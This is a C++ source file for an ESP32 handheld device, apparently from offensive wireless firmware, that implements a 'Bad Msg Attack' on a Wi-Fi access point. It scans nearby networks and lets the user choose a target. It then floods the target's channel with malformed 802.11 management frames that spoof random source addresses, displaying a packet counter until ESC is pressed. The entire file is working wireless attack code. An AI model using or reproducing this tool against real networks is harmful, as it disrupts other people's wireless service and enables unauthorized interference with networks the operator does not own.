#include "bad_msg_attack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>

void bad_msg_attack_setup() {
    drawMainBorderWithTitle("Scanning...");
    
    // Ensure WiFi is in STA mode for scanning
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    int n = WiFi.scanNetworks();
    if (n <= 0) {
        displayError("No APs found");
        return;
    }

    std::vector<Option> apOptions;
    for (int i = 0; i < n; i++) {
        apOptions.push_back({WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + ")", [](){}});
    }
    apOptions.push_back({"Back", [](){}});

    int selected = loopOptions(apOptions, MENU_TYPE_SUBMENU, "Select AP to Attack");
    if (selected < 0 || selected >= n) return;

    String ssid = WiFi.SSID(selected);
    uint8_t bssid[6];
    memcpy(bssid, WiFi.BSSID(selected), 6);
    int chan = WiFi.channel(selected);
    
    drawMainBorderWithTitle("Bad Msg Attack");
    tft.setTextSize(FP);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString("Attacking: " + ssid, tftWidth / 2, 50, 1);
    tft.drawCentreString("Press ESC to stop", tftWidth / 2, 80, 1);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);

    uint8_t bad_frame[] = {
        0xB0, 0x00, 0x00, 0x00, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (randomized)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x01, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04 // Malformed body
    };

    memcpy(&bad_frame[16], bssid, 6);

    long pkts = 0;
    while (!check(EscPress)) {
        for (int i = 10; i < 16; i++) bad_frame[i] = random(256);
        esp_wifi_80211_tx(WIFI_IF_STA, bad_frame, sizeof(bad_frame), false);
        pkts++;
        if (pkts % 100 == 0) {
            tft.fillRect(tftWidth / 2 - 40, 100, 100, 15, bruceConfig.bgColor);
            tft.setCursor(tftWidth / 2 - 40, 100);
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.printf("Pkts: %ld", pkts);
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
    
    esp_wifi_set_promiscuous(false);
}
